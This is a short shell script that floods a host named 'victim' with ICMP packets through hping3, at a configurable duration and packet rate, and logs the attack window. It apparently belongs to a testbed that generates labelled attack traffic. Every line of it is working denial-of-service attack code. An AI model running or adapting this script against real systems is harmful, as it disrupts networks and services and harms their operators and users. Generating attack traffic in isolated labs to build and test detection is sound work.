#!/bin/sh
# Ping flood against the victim (optional, another DoS style).
# Usage: icmpflood.sh [seconds] [microseconds_between_packets]    defaults 15 and 5000
. /attacks/lib.sh
DURATION="${1:-15}"
GAP="${2:-5000}"
echo "ICMP flood: ${DURATION}s, about $((1000000 / GAP)) packets per second, target: victim"
T0=$(now)
timeout "$DURATION" hping3 --icmp -i "u${GAP}" victim
log_window DoS icmpflood "$T0"
echo "ICMP flood finished"
